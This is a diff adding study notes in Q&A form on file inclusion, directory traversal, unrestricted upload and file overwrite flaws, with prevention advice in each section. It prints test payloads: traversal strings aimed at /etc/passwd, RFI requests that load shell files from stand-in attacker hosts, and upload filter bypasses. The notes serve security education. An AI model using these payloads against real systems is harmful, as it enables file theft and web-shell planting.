@@ -1,0 +1,152 @@
+File upload flaws
+
+File path traversal (LFI/RFI)
+
+Directory traversal
+
+Unrestricted file upload
+
+File overwrite attacks
+
+
+
+
+
+📂 1. File Path Traversal (LFI/RFI)
+Q1. What is Local File Inclusion (LFI)?
+A: LFI is a vulnerability where an attacker can manipulate a file path input to read files on the server (like /etc/passwd).
+
+Example:
+
+bash
+Copy
+Edit
+GET /view.php?file=../../../../etc/passwd
+Q2. What is Remote File Inclusion (RFI)?
+A: RFI occurs when an attacker can load a remote file (usually a malicious script) via a vulnerable input.
+
+Example:
+
+bash
+Copy
+Edit
+GET /view.php?file=http://attacker.com/shell.txt
+Q3. How to test for LFI?
+A:
+
+Try payloads like:
+
+bash
+Copy
+Edit
+../../../../etc/passwd
+..././..././..././etc/passwd
+Use null byte (%00) or extensions (.php, .log) if needed
+
+Q4. How to prevent LFI/RFI?
+A:
+
+Never use user input in file paths
+
+Maintain a strict list of allowed files (whitelisting)
+
+Disable allow_url_include in PHP for RFI
+
+Use basename() or path sanitizers
+
+📁 2. Directory Traversal
+Q5. What is Directory Traversal?
+A: It is a variant of path traversal that allows access to files outside the intended directory by using sequences like ../.
+
+Q6. Difference between Directory Traversal and LFI?
+A:
+
+Directory Traversal: Accesses raw files directly
+
+LFI: Includes and executes files (mostly in interpreted languages)
+
+Q7. Payloads for testing?
+A:
+
+../../../../etc/passwd
+
+%2e%2e%2f (encoded ../)
+
+Inject into upload paths, download APIs, logs
+
+📤 3. Unrestricted File Upload
+Q8. What is Unrestricted File Upload?
+A: It allows an attacker to upload any file type without validation — especially dangerous if web shells or scripts are uploaded.
+
+Q9. Risks of Unrestricted File Upload?
+A:
+
+Remote Code Execution (RCE)
+
+Malware hosting
+
+Defacement
+
+Access to internal systems
+
+Q10. How to test for it?
+A:
+
+Upload a .php, .jsp, or .aspx file with shell content
+
+Bypass filters with:
+
+.php.jpg
+
+.pHp
+
+Null byte (%00)
+
+Try directory traversal in filename:
+
+../../evil.php
+
+Q11. How to prevent it?
+A:
+
+Allow only specific extensions (whitelist)
+
+Rename files upon upload
+
+Store uploads outside the web root
+
+Validate MIME type on server-side
+
+Use antivirus or sandbox scanning
+
+✍️ 4. File Overwrite Attacks
+Q12. What are File Overwrite Attacks?
+A: These occur when an attacker uploads a file with the same name as an existing file, replacing critical files (e.g., index.php, .htaccess).
+
+Q13. How to test for file overwrite flaws?
+A:
+
+Upload a file with the same name as another static file
+
+Use path manipulation to overwrite sensitive files
+
+Monitor server behavior or error logs
+
+Q14. How to prevent file overwrite issues?
+A:
+
+Use unique file names (e.g., UUIDs or timestamps)
+
+Validate and sanitize filenames
+
+Set proper file system permissions
+
+Restrict upload path access
+
+✅ Summary Table
+Vulnerability	Description	Example Payload	Defense
+LFI	Read local server files	../../etc/passwd	Whitelist files, sanitize paths
+RFI	Include remote scripts	http://evil.com/shell.txt	Disable allow_url_include, whitelist includes
+Directory Traversal	Escape intended directories	../../admin/config.php	Canonical path checking, restrict input
+Unrestricted Upload	Upload arbitrary files	Upload shell.php, bypass extension check	MIME/type check, rename files, store outside web root
+File Overwrite	Replace critical files via upload	Upload index.php	Use random filenames, permission restrictions
